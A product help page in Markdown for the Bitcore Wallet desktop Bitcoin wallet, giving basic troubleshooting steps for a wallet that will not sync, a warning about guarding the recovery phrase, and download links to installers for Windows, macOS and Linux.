<p align="center"><img src="https://github.com/bitcore-projects/learn/raw/HEAD/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>

<h1 align="center">Why your Bitcoin wallet is not syncing</h1>

<p align="center"><a href="https://bitcorewallet.org/"><img src="https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge" alt="Website"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3"><img src="https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github" alt="Release"></a> <a href="https://bitcorewallet.org/fees"><img src="https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge" alt="Free"></a> <a href="https://bitcorewallet.org/self-custody"><img src="https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin" alt="Self-custody"></a></p>

> **Short answer:** Most sync problems come from network blocks, a wrong system clock or an outdated version; check those three first.

---

## You'll see this if
- The balance stays at zero or an old value
- A spinner never finishes
- Recent transactions do not appear

## Why it happens
A desktop wallet needs to talk to the network to fetch history. Firewalls, VPNs and clock errors quietly break that connection. For background, read the [wallet not syncing guide](https://bitcorewallet.org/guides/wallet-not-syncing) on the Bitcore Wallet website, or the related guide [What a multisig Bitcoin wallet is and when to use it](./multisig-bitcoin-wallet.md).

## How to fix it
1. Confirm your internet works and pause any VPN.
2. Set your system clock to automatic time.
3. Allow Bitcore Wallet through the firewall.
4. Update to the latest release.
5. Restart the wallet and wait a few minutes.

## If that didn't work
If nothing changes, restore the wallet from your recovery phrase on the same machine to rebuild its data. You can also check [latest updates](https://bitcorewallet.org/updates) and [How to use a watch-only Bitcoin wallet](./watch-only-wallet.md).

## Prevention
Install updates when they appear on the official release page. The [Bitcore Wallet FAQ](https://bitcorewallet.org/faq) has more detail.

> [!WARNING]
> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.

## FAQ
**Are my coins lost?**  
No. Sync issues affect display, not the blockchain.

**Should I reinstall?**  
Only after the steps above, and only with your phrase backed up.

---

## Get Bitcore Wallet

> [!TIP]
> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.

<p align="center"><a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe"><img src="https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg"><img src="https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip"><img src="https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

| Platform | File | Package | Requirements |
|---|---|---|---|
| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |

Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)

---

## Related guides
| Guide | |
|---|---|
| [How to handle a stuck Bitcoin transaction](./stuck-bitcoin-transaction.md) | Bitcore Wallet how-to |
| [Bitcoin network fees explained simply](./bitcoin-fees-explained.md) | Bitcore Wallet how-to |
| [Hot vs cold Bitcoin wallets: which do you need?](./hot-vs-cold-wallet.md) | Bitcore Wallet how-to |
| [All Bitcore Wallet guides](../README.md) | Index |
